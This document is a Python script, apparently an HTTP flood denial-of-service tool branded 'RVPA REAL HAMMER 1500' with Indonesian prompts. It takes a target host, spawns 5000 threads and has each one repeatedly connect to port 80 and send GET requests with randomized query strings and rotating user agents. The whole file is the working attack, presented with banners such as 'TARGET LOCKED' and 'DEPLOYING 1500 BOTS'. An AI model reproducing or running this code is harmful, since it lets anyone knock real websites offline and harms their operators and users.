import socket
import threading
import time
import random
from datetime import datetime

print("\033[91m")
print(r"""
   ██████╗ ██╗   ██╗██████╗  █████╗ 
   ██╔══██╗██║   ██║██╔══██╗██╔══██╗
   ██████╔╝██║   ██║██████╔╝███████║
   ██╔══██╗██║   ██║██╔══██╗██╔══██║
   ██║  ██║╚██████╔╝██║  ██║██║  ██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
         RVPA REAL HAMMER 1500
""")
print("\033[0m")

target = input("\033[93mMasukkan Target (IP atau URL) : \033[0m").strip()

if target.startswith("http"):
    host = target.replace("http://", "").replace("https://", "").split("/")[0]
else:
    host = target

threads = 5000

try:
    with open("user.db", "r") as f:
        user_agents = [line.strip() for line in f if line.strip()]
    print(f"\033[92m[+] Loaded {len(user_agents)} User Agents\033[0m")
except:
    print("\033[91m[-] user.db tidak ditemukan!\033[0m")
    exit()

packet_count = 0
lock = threading.Lock()

def real_hammer():
    global packet_count
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))
            ua = random.choice(user_agents)
            rand = random.randint(100000000, 999999999)
            
            payload = f"GET /?rvpa={rand} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
            s.sendall(payload.encode())
            s.close()
            
            with lock:
                packet_count += 1
        except:
            pass

print(f"\033[91m[+] TARGET LOCKED → {host}\033[0m")
print(f"\033[91m[+] DEPLOYING 1500 BOTS...\033[0m\n")

for i in range(threads):
    t = threading.Thread(target=real_hammer)
    t.daemon = True
    t.start()
    if i % 200 == 0:
        time.sleep(0.005)

print("\033[91m[+] BOT IS HAMMERING THE TARGET HARD!\033[0m\n")

try:
    while True:
        now = datetime.now().strftime("%a %b %d %H:%M:%S %Y")
        with lock:
            current = packet_count
        print(f"\033[91m{now}\033[0m")
        print("\033[91m<--packet sent! hammering-->\033[0m")
        print("bot is hammering...")
        print("bot is hammering...")
        print(f"bot is hammering... [{current:,} packets sent]\033[0m")
        print("")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n\033[91m[+] ATTACK STOPPED BY TUAN RVPA\033[0m")
